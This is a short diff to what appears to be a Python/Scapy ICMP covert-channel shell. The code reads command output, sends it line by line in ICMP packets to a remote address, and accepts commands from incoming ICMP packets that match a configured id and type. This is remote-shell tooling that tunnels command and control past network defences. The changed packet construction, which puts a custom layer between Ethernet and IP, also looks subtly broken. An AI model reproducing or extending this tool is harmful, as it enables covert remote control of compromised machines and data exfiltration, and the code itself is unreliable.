@@ -24,7 +24,7 @@ def readstdout():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(type=config.TYPE,
+        reply_packet = Ether(dst=destination_mac) / CustomICMPPacket(ish_type=1) / IP(dst=destination_ip) / ICMP(type=config.TYPE,
                                                                                   id=config.ID) / string
         sendp(reply_packet, verbose=False)
         sys.stdout.write(string + "\n")
@@ -48,8 +48,8 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac
-    if (packet[CustomICMPPacket].ish_type == 0 and packet[CustomICMPPacket].id == config.ID and
-            packet[CustomICMPPacket].type == config.TYPE):
+    if (packet[CustomICMPPacket].ish_type == 0 and packet[ICMP].id == config.ID and
+            packet[ICMP].type == config.TYPE):
         destination_ip = packet[IP].src
         destination_mac = packet[Ether].src
         received_data = packet[ICMP].payload.load.decode('utf-8')
